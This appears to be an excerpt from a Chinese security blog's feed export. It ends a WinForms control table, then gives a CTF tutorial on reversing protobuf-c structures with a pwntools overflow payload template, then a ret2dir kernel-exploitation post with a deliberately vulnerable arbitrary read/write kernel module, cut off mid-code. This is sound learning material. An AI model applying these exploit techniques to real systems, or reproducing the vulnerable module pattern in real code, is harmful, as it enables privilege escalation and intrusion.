<td>- <code>Add()</code>：添加项<br /> - <code>Remove()</code>：移除项<br /> - <code>Clear()</code>：清空项<br /> - <code>SelectedIndexChanged</code>：选项变化事件</td>
</tr>
<tr>
<td><strong>CheckBox</strong></td>
<td>- <code>Checked</code>：是否选中 <br />- <code>Text</code>：文本 <br />- <code>AutoSize</code>：是否自动调整大小 <br />- <code>CheckState</code>：勾选状态（<code>Checked</code>、<code>Unchecked</code>）</td>
<td>- <code>PerformClick()</code>：模拟点击 <br />- <code>CheckedChanged</code>：选中状态变化事件</td>
</tr>
<tr>
<td><strong>RadioButton</strong></td>
<td>- <code>Checked</code>：是否选中 <br />- <code>Text</code>：文本 <br />- <code>GroupName</code>：分组名称，防止多个单选框互相独立</td>
<td>- <code>CheckedChanged</code>：选中状态变化事件<br />- <code>PerformClick()</code>：模拟点击</td>
</tr>
<tr>
<td><strong>Panel</strong></td>
<td>- <code>BackColor</code>：背景色 <br />- <code>Dock</code>：停靠方式（如 <code>DockStyle.Fill</code>）<br />- <code>Padding</code>：控件的内边距</td>
<td>- <code>Controls.Add()</code>：向面板添加控件 <br />- <code>Controls.Remove()</code>：移除控件</td>
</tr>
<tr>
<td><strong>PictureBox</strong></td>
<td>- <code>Image</code>：显示的图片 <br />- <code>SizeMode</code>：图片显示方式（如 <code>StretchImage</code>、<code>Zoom</code>） <br />- <code>BackColor</code>：背景颜色</td>
<td>- <code>Load()</code>：加载图片 <br />- <code>Refresh()</code>：重绘图片</td>
</tr>
<tr>
<td><strong>RichTextBox</strong></td>
<td>- <code>Text</code>：文本内容 <br />- <code>Font</code>：字体 <br />- <code>SelectionStart</code>：选中文本的起始位置<br />- <code>SelectionLength</code>：选中文本的长度</td>
<td>- <code>AppendText()</code>：追加文本 <br />- <code>Clear()</code>：清空文本 <br />- <code>Find()</code>：查找文本</td>
</tr>
<tr>
<td><strong>DateTimePicker</strong></td>
<td>- <code>Value</code>：选定的日期时间 <br />- <code>Format</code>：日期时间格式 <br />- <code>MinDate</code>：最小日期 <br />- <code>MaxDate</code>：最大日期</td>
<td>- <code>CloseUp()</code>：关闭下拉日历 <br />- <code>DropDown()</code>：展开下拉日历</td>
</tr>
<tr>
<td><strong>TrackBar</strong></td>
<td>- <code>Minimum</code>：最小值 <br />- <code>Maximum</code>：最大值 <br />- <code>Value</code>：当前值 <br />- <code>TickFrequency</code>：刻度频率</td>
<td>- <code>ValueChanged</code>：值变化事件</td>
</tr>
<tr>
<td><strong>TabControl</strong></td>
<td>- <code>TabPages</code>：Tab页集合 <br />- <code>SelectedTab</code>：当前选中的Tab页 <br />- <code>Alignment</code>：Tab的对齐方式</td>
<td>- <code>SelectTab()</code>：切换选中的Tab</td>
</tr>
<tr>
<td><strong>ToolTip</strong></td>
<td>- <code>ToolTipTitle</code>：工具提示标题 <br />- <code>IsBalloon</code>：是否气泡提示 <br />- <code>InitialDelay</code>：首次显示延迟</td>
<td>- <code>SetToolTip()</code>：为控件设置工具提示</td>
</tr>
<tr>
<td><strong>TreeView</strong></td>
<td>- <code>Nodes</code>：树节点集合 <br />- <code>SelectedNode</code>：选中的节点 <br />- <code>CheckBoxes</code>：是否启用复选框</td>
<td>- <code>ExpandAll()</code>：展开所有节点 <br />- <code>CollapseAll()</code>：折叠所有节点</td>
</tr>
<tr>
<td><strong>DateTimePicker</strong></td>
<td>- <code>Value</code>：当前选中的日期时间 <br />- <code>Format</code>：日期时间显示格式</td>
<td>- <code>CloseUp()</code>：关闭日历窗口 <br />- <code>DropDown()</code>：打开日历窗口</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Development</category>
      </categories>
      <tags>
        <tag>C#</tag>
        <tag>Development</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>protobuf初探</title>
    <url>/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h4 id="protobuf简介"><a href="#protobuf简介" class="headerlink" title="protobuf简介"></a>protobuf简介</h4><p>Protocol Buffers（通常简称为protobuf）是由Google开发的一种语言中立、平台中立的序列化结构数据的方法。它用于高效地存储和交换数据，特别适合用于网络通信和数据存储。protobuf的主要特点包括：</p>
<ol>
<li><strong>高效性</strong>：protobuf使用紧凑的二进制格式，比其他文本格式（如JSON或XML）更小、更快。</li>
<li><strong>语言中立</strong>：支持多种编程语言，包括C++、Java、Python、Go等，使得跨平台的数据交换变得简单。</li>
<li><strong>易于扩展</strong>：可以在不破坏现有数据结构的情况下，轻松地添加新字段。</li>
<li><strong>定义文件</strong>：使用<code>.proto</code>文件来定义数据结构和服务，可以通过工具自动生成相应的代码。</li>
</ol>
<p>通过protobuf，开发者可以定义消息类型，使用这些类型进行数据序列化和反序列化，从而在不同的系统或服务之间传输数据。</p>
<p><strong>Proto2</strong>: 支持 <code>required</code> 和 <code>optional</code> 修饰符。</p>
<p><strong>Proto3</strong>: 默认所有字段为 <code>optional</code>，不支持 <code>required</code></p>
<h4 id="工具集安装"><a href="#工具集安装" class="headerlink" title="工具集安装"></a>工具集安装</h4><ul>
<li>pbtk:（自动化分析）</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install python3-pip git openjdk-11-jre libqt5x11extras5 python3-pyqt5.qtwebengine python3-pyqt5</span><br><span class="line">sudo pip3 install protobuf pyqt5 pyqtwebengine requests websocket-client</span><br><span class="line">git clone https://github.com/marin-m/pbtk</span><br></pre></td></tr></table></figure></div>

<ul>
<li>Protobuf 库:（本地搓proto文件并编译成python）</li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y protobuf-compiler libprotobuf-dev		</span><br><span class="line">sudo apt-get install libprotobuf-c-dev protobuf-c-compiler</span><br></pre></td></tr></table></figure></div>



<h4 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h4><p>protobuf这类题一般都会将输入转化成特殊的结构体，这就要求我们首先要逆向出proto结构体。</p>
<h4 id="一些结构体定义"><a href="#一些结构体定义" class="headerlink" title="一些结构体定义"></a>一些结构体定义</h4><h6 id="ProtobufCFieldDescriptor"><a href="#ProtobufCFieldDescriptor" class="headerlink" title="ProtobufCFieldDescriptor"></a>ProtobufCFieldDescriptor</h6><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026151257848.png"
                      class=""
                >

<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ProtobufCFieldDescriptor</span> &#123;</span></span><br><span class="line">    <span class="comment">/** Name of the field as given in the .proto file. */</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>      *name;				</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Tag value of the field as given in the .proto file. */</span></span><br><span class="line">    <span class="type">uint32_t</span>        id;					</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Whether the field is `REQUIRED`, `OPTIONAL`, or `REPEATED`. */</span></span><br><span class="line">    ProtobufCLabel      label;					</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** The type of the field. */</span></span><br><span class="line">    ProtobufCType       type;					</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The offset in bytes of the message&#x27;s C structure&#x27;s quantifier field</span></span><br><span class="line"><span class="comment">     * (the `has_MEMBER` field for optional members or the `n_MEMBER` field</span></span><br><span class="line"><span class="comment">     * for repeated members or the case enum for oneofs).</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span>        quantifier_offset;							</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The offset in bytes into the message&#x27;s C structure for the member</span></span><br><span class="line"><span class="comment">     * itself.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span>        offset;					</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * A type-specific descriptor.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * If `type` is `PROTOBUF_C_TYPE_ENUM`, then `descriptor` points to the</span></span><br><span class="line"><span class="comment">     * corresponding `ProtobufCEnumDescriptor`.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * If `type` is `PROTOBUF_C_TYPE_MESSAGE`, then `descriptor` points to</span></span><br><span class="line"><span class="comment">     * the corresponding `ProtobufCMessageDescriptor`.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Otherwise this field is NULL.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">const</span> <span class="type">void</span>      *descriptor; <span class="comment">/* for MESSAGE and ENUM types */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/** The default value for this field, if defined. May be NULL. */</span></span><br><span class="line">    <span class="type">const</span> <span class="type">void</span>      *default_value;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * A flag word. Zero or more of the bits defined in the</span></span><br><span class="line"><span class="comment">     * `ProtobufCFieldFlag` enum may be set.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">uint32_t</span>        flags;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Reserved for future use. */</span></span><br><span class="line">    <span class="type">unsigned</span>        reserved_flags;</span><br><span class="line">    <span class="comment">/** Reserved for future use. */</span></span><br><span class="line">    <span class="type">void</span>            *reserved2;</span><br><span class="line">    <span class="comment">/** Reserved for future use. */</span></span><br><span class="line">    <span class="type">void</span>            *reserved3;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<h6 id="label和type"><a href="#label和type" class="headerlink" title="label和type"></a>label和type</h6><p>label和type都是枚举类型：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    <span class="comment">/** A well-formed message must have exactly one of this field. */</span></span><br><span class="line">    PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * A well-formed message can have zero or one of this field (but not</span></span><br><span class="line"><span class="comment">     * more than one).</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    PROTOBUF_C_LABEL_OPTIONAL,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * This field can be repeated any number of times (including zero) in a</span></span><br><span class="line"><span class="comment">     * well-formed message. The order of the repeated values will be</span></span><br><span class="line"><span class="comment">     * preserved.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    PROTOBUF_C_LABEL_REPEATED,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * This field has no label. This is valid only in proto3 and is</span></span><br><span class="line"><span class="comment">     * equivalent to OPTIONAL but no &quot;has&quot; quantifier will be consulted.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    PROTOBUF_C_LABEL_NONE,</span><br><span class="line">&#125; ProtobufCLabel;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    PROTOBUF_C_TYPE_INT32,      <span class="comment">/**0&lt; int32 */</span></span><br><span class="line">    PROTOBUF_C_TYPE_SINT32,     <span class="comment">/**1&lt; signed int32 */</span></span><br><span class="line">    PROTOBUF_C_TYPE_SFIXED32,   <span class="comment">/**2&lt; signed int32 (4 bytes) */</span></span><br><span class="line">    PROTOBUF_C_TYPE_INT64,      <span class="comment">/**3&lt; int64 */</span></span><br><span class="line">    PROTOBUF_C_TYPE_SINT64,     <span class="comment">/**4&lt; signed int64 */</span></span><br><span class="line">    PROTOBUF_C_TYPE_SFIXED64,   <span class="comment">/**5&lt; signed int64 (8 bytes) */</span></span><br><span class="line">    PROTOBUF_C_TYPE_UINT32,     <span class="comment">/**6&lt; unsigned int32 */</span></span><br><span class="line">    PROTOBUF_C_TYPE_FIXED32,    <span class="comment">/**7&lt; unsigned int32 (4 bytes) */</span></span><br><span class="line">    PROTOBUF_C_TYPE_UINT64,     <span class="comment">/**8&lt; unsigned int64 */</span></span><br><span class="line">    PROTOBUF_C_TYPE_FIXED64,    <span class="comment">/**9&lt; unsigned int64 (8 bytes) */</span></span><br><span class="line">    PROTOBUF_C_TYPE_FLOAT,      <span class="comment">/**10&lt; float */</span></span><br><span class="line">    PROTOBUF_C_TYPE_DOUBLE,     <span class="comment">/**11&lt; double */</span></span><br><span class="line">    PROTOBUF_C_TYPE_BOOL,       <span class="comment">/**12&lt; boolean */</span></span><br><span class="line">    PROTOBUF_C_TYPE_ENUM,       <span class="comment">/**13&lt; enumerated type */</span></span><br><span class="line">    PROTOBUF_C_TYPE_STRING,     <span class="comment">/**14&lt; UTF-8 or ASCII string */</span></span><br><span class="line">    PROTOBUF_C_TYPE_BYTES,      <span class="comment">/**15&lt; arbitrary byte sequence */</span></span><br><span class="line">    PROTOBUF_C_TYPE_MESSAGE,    <span class="comment">/**16&lt; nested message */</span></span><br><span class="line">&#125; ProtobufCType;</span><br></pre></td></tr></table></figure></div>

<h4 id="定位结构体方式"><a href="#定位结构体方式" class="headerlink" title="定位结构体方式"></a>定位结构体方式</h4><h5 id="1-手动定位"><a href="#1-手动定位" class="headerlink" title="1.手动定位"></a>1.手动定位</h5><p>因为我们输入的内容会通过<code>protobuf_c_message_unpack</code>这个函数进行解析。所以我们可以对比链接库中的函数具体定义以及我们pwn的主程序中调用的传参。然后就能跳转到主程序中的具体descriptor中进行下一步分析。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026144416901.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026144538997.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026144611512.png"
                      class=""
                >

<p>首先要在主程序里找一个<code>message_descriptor</code>，一般在.data.rel.ro段，其开头的魔数(magic)是0x28AAEEF9，一般而言下面会直接解析出Protobuf结构体的名字，但也有IDA识别不出来的情况，我们可以手动将db类型转为dq类型，然后就会清晰很多。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026143624589.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026144134084.png"
                      class=""
                >

<p>我们的消息结构体名字就为<code>MyMessage</code>。接着我们可以往<code>my_message__field_descriptors</code>里看，里面就是具体的字段，也就是<code>ProtobufCFieldDescriptor</code>这个结构体。但是也都被IDA当作了db解析，我们可以按照下表结构体的字段分布进行修改，手动将其解析一下，主要看name，id，label，type，其他怎么改影响不大。一下子就清晰了不少，然后我们就可以对照着枚举表还原出protobuf了。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026151257848.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026144919768.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026150209780.png"
                      class=""
                >

<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//message.proto</span></span><br><span class="line">syntax = <span class="string">&quot;proto2&quot;</span>;</span><br><span class="line"></span><br><span class="line">message MyMessage&#123;</span><br><span class="line">    optional <span class="built_in">string</span> name = <span class="number">1</span>;</span><br><span class="line">    required bytes buffer = <span class="number">3</span>;</span><br><span class="line">    required uint32 size = <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>然后在命令行将其转化成python文件即可</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">protoc --python_out=. message.proto</span><br></pre></td></tr></table></figure></div>



<h5 id="2-自动分析"><a href="#2-自动分析" class="headerlink" title="2.自动分析"></a>2.自动分析</h5><p>首先进入之前安装好的pbtk目录，<code>python3 gui.py</code> 就可以启动一个gui窗口，然后选择<code>Extract .proto structures from apps</code>，就可以选择pwn程序自动提取其中的proto文件了。但有时会不灵，还是手动分析有趣。</p>
<h4 id="脚本编写"><a href="#脚本编写" class="headerlink" title="脚本编写"></a>脚本编写</h4><p>分析完proto的结构，就可以进行exp脚本的编写了，之前我们通过proto生成的python文件名为<code>proto结构体名_pb2</code>，可以先导入exp。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> message_pb2</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line">p = process(<span class="string">&quot;filename&quot;</span>)</span><br><span class="line">......</span><br><span class="line">msg = message_pb2.MyMessage()		<span class="comment">#创建结构体</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#各字段赋值</span></span><br><span class="line">msg.name = <span class="string">&#x27;Admin&#x27;</span></span><br><span class="line">msg.buffer = shellcode.ljust(<span class="number">0x208</span>,<span class="string">b&quot;a&quot;</span>) + p64(canary) + p64(<span class="number">0</span>) + p64(tar)</span><br><span class="line">msg.size = <span class="number">0x220</span></span><br><span class="line"></span><br><span class="line">payload = msg.SerializeToString()		<span class="comment">#转化成proto的序列化字符串</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">......</span><br></pre></td></tr></table></figure></div>



<h4 id="判别proto版本方式"><a href="#判别proto版本方式" class="headerlink" title="判别proto版本方式"></a>判别proto版本方式</h4><p>一般proto分为proto2和proto3两个版本，在写proto文件时要在开头指明<code>syntax=proto2/3</code>。</p>
<p>在proto3中移除了require这个修饰符，如果有的label位为0（required），就说明用的是proto2语法。</p>
<p>其实也可以都带进去试试，总共就两个版本，别的地方没分析错的话总有一个会通过的。</p>
<h4 id="常见问题解决"><a href="#常见问题解决" class="headerlink" title="常见问题解决"></a>常见问题解决</h4><h5 id="1-库找不到"><a href="#1-库找不到" class="headerlink" title="1.库找不到"></a>1.库找不到</h5><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026002833645.png"
                      class=""
                >

<p>可以手动在&#x2F;usr&#x2F;lib下添加一个链接</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ln -s /mnt/e/ctf/2024shctf/pwn/shctf——challage_pwn_protobuf/libprotobuf-c.so.1 /usr/lib/libprotobuf-c.so.1</span><br></pre></td></tr></table></figure></div>

<h5 id="2-运行exp时因为引入了proto转成的python文件报错"><a href="#2-运行exp时因为引入了proto转成的python文件报错" class="headerlink" title="2.运行exp时因为引入了proto转成的python文件报错"></a>2.运行exp时因为引入了proto转成的python文件报错</h5><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026154314346.png"
                      class=""
                >

<p>提高python库中protobuf的版本</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">pip3 uninstall protobuf</span><br><span class="line">pip3 install protobuf==3.19.0</span><br></pre></td></tr></table></figure></div>



<h5 id="3-逆出结构体后prpto一直无法正常解析"><a href="#3-逆出结构体后prpto一直无法正常解析" class="headerlink" title="3.逆出结构体后prpto一直无法正常解析"></a>3.逆出结构体后prpto一直无法正常解析</h5><p>可以尝试把<code>sendline</code>换成<code>send</code>，有时候多一个换行符就解析不出来了。</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>protobuf</tag>
      </tags>
  </entry>
  <entry>
    <title>ret2dir手法学习</title>
    <url>/blog/2025/03/09/ret2dir%E6%89%8B%E6%B3%95%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="ret2dir手法学习"><a href="#ret2dir手法学习" class="headerlink" title="ret2dir手法学习"></a>ret2dir手法学习</h2><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>Ret2dir（Return-to-Direct Mapping）是一种 <strong>内核利用</strong> 技术，攻击者可以利用它 <strong>绕过 SMEP、SMAP、pxn 等用户空间与内核空间隔离的防护手段</strong>，最终实现 <strong>本地提权</strong>。</p>
<p>在 <strong>大多数 Linux 内核（基于 x86_64 架构）</strong> 中，<strong>物理地址（Physical Address）</strong> 的很大一部分会被 <strong>直接映射（direct mapping）</strong> 到 <strong>内核虚拟地址空间（Kernel Virtual Address Space）</strong>，即 <code>physmap</code> 区域。这意味着，<strong>用户态（Userland）可以通过某些手段影响物理页</strong>，而内核可能会使用这些页，从而形成攻击面。</p>
<p>比如我们如果在用户空间大量申请内存，这些内存会停留在 ram 中，也就是会占用实际的物理地址，这些物理内存是会被physmap映射的，那么我们就能够通过改用户空间的内存，在内核空间布置<strong>ROP链</strong>（高版本有不可执行，所以不能直接布置shellcode），然后在内核空间劫持程序执行流到对应的ROP链即可。</p>
<h4 id="Case-Study"><a href="#Case-Study" class="headerlink" title="Case Study"></a>Case Study</h4><p>这里先参照<a class="link"   href="https://www.anquanke.com/post/id/185408" >这篇文章<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>自己搭个内核环境以及编写一个具有漏洞的模块进行学习。我们先写一个自己的内核模块，这里注册了一个叫做<strong>kpwn</strong>的misc设备以便之后用ioctl方式进行交互。这个模块提供了任意地址读、任意地址写、任意分配和回收内存的功能，以方便进行ret2dir的原理验证。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/cdev.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/uaccess.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/miscdevice.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/delay.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;Dual BSD/GPL&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> READ_ANY  0x1111</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WRITE_ANY 0x2222</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADD_ANY   0x3333</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEL_ANY   0x4444</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in_args</span>&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> addr;</span><br><span class="line">    <span class="type">uint64_t</span> size;</span><br><span class="line">    <span class="type">char</span> __user *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">read_any</span><span class="params">(<span class="keyword">struct</span> in_args *args)</span>&#123;         <span class="comment">//任意读取内核地址，可以内存搜索</span></span><br><span class="line">    <span class="type">long</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> *addr = (<span class="type">void</span> *)args-&gt;addr;</span><br><span class="line">    <span class="keyword">if</span>(copy_to_user(args-&gt;buf,addr,args-&gt;size))&#123;</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">write_any</span><span class="params">(<span class="keyword">struct</span> in_args *args)</span>&#123;        <span class="comment">//任意改写内核地址</span></span><br><span class="line">    <span class="type">long</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> *addr = (<span class="type">void</span> *)args-&gt;addr;</span><br><span class="line">    <span class="keyword">if</span>(copy_from_user(addr,args-&gt;buf,args-&gt;size))&#123;</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">add_any</span><span class="params">(<span class="keyword">struct</span> in_args *args)</span>&#123;          <span class="comment">//任意申请内核地址并返回给用户态</span></span><br><span class="line">    <span class="type">long</span> ret = <span class="number">0</span>;       </span><br><span class="line">    <span class="type">char</span> *buffer = kmalloc(args-&gt;size,GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span>(buffer == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(copy_to_user(args-&gt;buf,(<span class="type">void</span> *)&amp;buffer,<span class="number">0x8</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">del_any</span><span class="params">(<span class="keyword">struct</span> in_args *args)</span>&#123;          <span class="comment">//用户态任意释放内核地址</span></span><br><span class="line">    <span class="type">long</span> ret = <span class="number">0</span>;</span><br><span class="line">    kfree((<span class="type">void</span> *)args-&gt;addr);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">kpwn_ioctl</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span>&#123;</span><br><span class="line">    <span class="type">long</span> ret = -EINVAL;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_args</span> <span class="title">in</span>;</span></span><br><span class="line">    <span class="keyword">if</span>(copy_from_user(&amp;in,(<span class="type">void</span> *)arg,<span class="keyword">sizeof</span>(in)))&#123;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">switch</span>(cmd)&#123;</span><br><span class="line">        <span class="keyword">case</span> READ_ANY:</span><br><span class="line">            ret = read_any(&amp;in);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> WRITE_ANY:</span><br><span class="line">            ret = write_any(&amp;in);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> DEL_ANY:</span><br><span class="line">            ret = del_any(&amp;in);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> ADD_ANY:</span><br><span class="line">            ret = add_any(&amp;in);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            ret = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">fops</span> =</span> &#123;</span><br><span class="line">    .owner = THIS_MODULE,</span><br><span class="line">    .open =      <span class="literal">NULL</span>,</span><br><span class="line">    .release =   <span class="literal">NULL</span>,</span><br><span class="line">    .read =      <span class="literal">NULL</span>,</span><br><span class="line">    .write =     <span class="literal">NULL</span>,</span><br><span class="line">    .unlocked_ioctl = kpwn_ioctl</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">miscdevice</span> <span class="title">misc</span> =</span> &#123;</span><br><span class="line">    .minor = MISC_DYNAMIC_MINOR,</span><br><span class="line">    .name  = <span 